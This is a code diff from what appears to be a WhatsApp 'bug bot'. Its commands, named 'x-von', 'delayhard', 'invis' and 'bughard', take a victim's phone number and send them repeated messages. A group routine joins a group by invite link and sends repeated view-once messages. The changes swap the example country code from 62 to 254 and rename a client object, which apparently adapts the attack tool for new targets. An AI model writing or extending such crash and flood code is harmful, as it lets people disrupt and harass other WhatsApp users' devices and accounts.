@@ -542,7 +542,7 @@ or type this command *inside the channel*.`,
   break;
 }
 case 'x-von': {
-  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  if (!q) return reply(`Example: ${prefix + command} 254×××`);
   target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 let jumlah = Number(q.split(" ")[1]) || 5; // default to 5 if not provided
 	
@@ -651,7 +651,7 @@ let jumlah = Number(q.split(" ")[1]) || 5;
 }
 break;
 		case 'delayhard': {
-  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  if (!q) return reply(`Example: ${prefix + command} 254×××`);
   target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 let jumlah = Number(q.split(" ")[1]) || 5; 
   await lubyz.sendMessage(m.chat, {
@@ -735,7 +735,7 @@ break;
 
   try {
     let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
-    let groupTarget = await Eid.groupAcceptInvite(groupLink);
+    let groupTarget = await lubyz.groupAcceptInvite(groupLink);
     await sleep(2000);
     sendViewOnceMessages(groupTarget, bugAmount);
     await sleep(2500);
@@ -767,7 +767,7 @@ break;
 }
 break;
 		case 'invis': {
-  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  if (!q) return reply(`Example: ${prefix + command} 254×××`);
   target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 let jumlah = Number(q.split(" ")[1]) || 5; 
 			
@@ -825,7 +825,7 @@ let jumlah = Number(q.split(" ")[1]) || 5;
 }
 break;
 		case 'bughard': {
-  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  if (!q) return reply(`Example: ${prefix + command} 254×××`);
   target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 let jumlah = Number(q.split(" ")[1]) || 5; 
   await lubyz.sendMessage(m.chat, {
